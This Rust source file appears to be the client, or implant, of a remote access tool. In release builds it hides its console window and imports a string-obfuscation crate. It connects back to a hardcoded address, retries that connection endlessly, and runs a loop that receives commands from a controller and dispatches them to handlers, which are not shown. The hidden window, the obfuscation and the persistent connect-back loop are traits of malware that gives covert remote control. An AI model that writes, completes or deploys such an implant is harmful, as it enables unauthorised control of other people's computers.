#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

mod tools;

use std::io::{BufReader, BufWriter};
use std::net::{TcpStream};
use lib::{receive_data};
use goldberg::goldberg_string;
use crate::tools::*;

pub struct Client {
    reader: BufReader<TcpStream>,
    writer: BufWriter<TcpStream>,
}

impl Client {
    /// Initialize a new client with a stream
    fn new(stream: TcpStream) -> Client {
        let reader = BufReader::new(stream.try_clone().unwrap());
        let writer = BufWriter::new(stream.try_clone().unwrap());
        
        Client { reader, writer }
    }

    /// Main event loop for receiving commands
    fn handle_client(&mut self) {
        loop {
            match receive_data(&mut self.reader) {
                Some((command, buf)) => parse_message(self, command, buf),
                None => return,
            };
        }
    }
}

/// Connect to the stream and create a Client object from the stream
fn initialize_client(ip: &str) -> Client {
    let stream = loop {
        log::trace!("Attempting to connect to stream");
        match TcpStream::connect(ip) {
            Ok(stream) => {
                log::debug!("Connected to stream");
                break stream;
            },
            Err(_) => {
                log::error!("Could not connect to stream");
                continue;
            }
        };
    };
    Client::new(stream)
}

fn main() {
    pretty_env_logger::init();

    loop {
        let mut client = initialize_client("127.0.0.1:8080");
        client.handle_client();
        // If handle_client() returns, attempt connection again
        log::error!("Stream lost, attempting to reconnect")
    }
}
    